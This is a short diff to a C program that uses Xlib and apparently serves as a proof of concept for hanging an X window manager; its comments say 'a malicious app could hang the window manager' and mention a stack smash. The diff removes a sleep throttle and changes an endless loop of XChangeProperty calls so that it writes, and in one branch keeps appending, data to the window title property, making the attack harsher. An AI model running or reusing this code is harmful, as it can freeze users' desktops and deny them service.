@@ -13,7 +13,6 @@ func()
      * A malicious app could hang the window manager.
      * How long to clear ~2-5 seconds per ~.5 seconds of execution, may vary on different systems.
      */
-    usleep(1);
 }
 
 /* Stack Smash,
@@ -39,10 +38,10 @@ main()
     while(1)
     {
         if(i % 2)
-        {   XChangeProperty(dpy, win, XA_STRING, XA_STRING, 32, PropModeReplace, (const unsigned char *)str, strlen(str) + 1);
+        {   XChangeProperty(dpy, win, XA_WM_NAME, XA_WM_NAME, 32, PropModeAppend, (const unsigned char *)str, strlen(str) + 1);
         }
         else
-        {   XChangeProperty(dpy, win, XA_STRING, XA_STRING, 32, PropModeReplace, (const unsigned char *)str2, strlen(str2) + 1);
+        {   XChangeProperty(dpy, win, XA_WM_NAME, XA_WM_NAME, 32, PropModeReplace, (const unsigned char *)str2, strlen(str2) + 1);
         }
         ++i;
         func();
